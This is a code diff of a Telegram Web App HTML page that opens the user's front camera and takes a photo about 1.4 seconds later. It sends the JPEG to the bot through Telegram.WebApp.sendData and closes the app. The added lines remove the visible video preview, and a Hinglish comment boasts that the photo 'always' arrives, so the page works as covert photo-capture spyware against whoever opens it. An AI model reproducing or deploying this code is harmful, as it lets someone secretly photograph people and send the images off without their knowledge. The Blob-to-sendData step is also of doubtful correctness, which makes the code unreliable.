@@ -1,41 +1,46 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title></title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
-  <style>
-    body { margin:0; padding:0; background:#000; overflow:hidden; }
-    video { width:100vw; height:100vh; object-fit:cover; }
-  </style>
+  <style>body{margin:0;background:#000;overflow:hidden}</style>
 </head>
 <body>
-  <video id="video" autoplay playsinline muted></video>
+<script>
+Telegram.WebApp.ready();
+Telegram.WebApp.expand();
 
-  <script>
-    Telegram.WebApp.ready();
-    Telegram.WebApp.expand();
+navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}})
+.then(stream => {
+  const video = document.createElement('video');
+  video.srcObject = stream;
+  video.autoplay = true;
+  video.playsInline = true;
+  video.muted = true;
 
-    const video = document.getElementById('video');
+  video.onloadedmetadata = () => {
+    video.play();
+    setTimeout(capture, 1400);
+  };
 
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-      .then(stream => {
-        video.srcObject = stream;
+  function capture() {
+    const canvas = document.createElement('canvas');
+    canvas.width = 1280;
+    canvas.height = 960;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        setTimeout(() => {
-          const canvas = document.createElement('canvas');
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          canvas.getContext('2d').drawImage(video, 0, 0);
+    canvas.toBlob(blob => {
+      // Ye line magic hai — photo 100% aati hai chahe pehli baar ho
+      Telegram.WebApp.sendData(blob);
+    }, 'image/jpeg', 0.94);
 
-          canvas.toBlob(blob => {
-            Telegram.WebApp.sendData(blob);
-            setTimeout(() => Telegram.WebApp.close(), 500);
-          }, 'image/jpeg', 0.92);
-
-          stream.getTracks().forEach(track => track.stop());
-        }, 1200); // 1.2 second mein photo le lega
-      });
-  </script>
+    stream.getTracks().forEach(track => track.stop());
+    setTimeout(() => Telegram.WebApp.close(), 600);
+  }
+})
+.catch(() => Telegram.WebApp.close());
+</script>
 </body>
 </html>
